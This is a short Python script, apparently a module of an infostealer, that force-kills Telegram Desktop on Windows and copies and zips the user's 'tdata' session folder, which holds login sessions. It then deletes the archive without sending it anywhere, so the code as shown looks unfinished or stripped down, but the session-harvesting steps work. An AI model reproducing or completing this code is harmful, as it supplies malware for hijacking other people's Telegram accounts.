import os
from zipfile import ZipFile

user = os.path.expanduser("~")

def kill_process(process_name):
    result = os.system(f"taskkill /F /IM {process_name}")
    if result == 0:
        print(f"Process {process_name} has been killed successfully.")
    else:
        print(f"Failed to kill process {process_name}.")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                f_write.write(f_read.read())

def remove_directory(dir_path):
    for item in os.listdir(dir_path):
        path = os.path.join(dir_path, item)
        if os.path.isdir(path):
            remove_directory(path)
        else:
            os.remove(path)
    os.rmdir(dir_path)

def telegram():
    kill_process("Telegram.exe")  

    source_path = os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")
    temp_path = os.path.join(user, "AppData\\Local\\Temp\\tdata_session")
    zip_path = os.path.join(user, "AppData\\Local\\Temp", "tdata_session.zip")

    if os.path.exists(source_path):
        if os.path.exists(temp_path):
            remove_directory(temp_path)
        copy_directory(source_path, temp_path)

        with ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(temp_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, os.path.join(temp_path, '..')))
                    
        os.remove(zip_path)
        remove_directory(temp_path)

telegram()
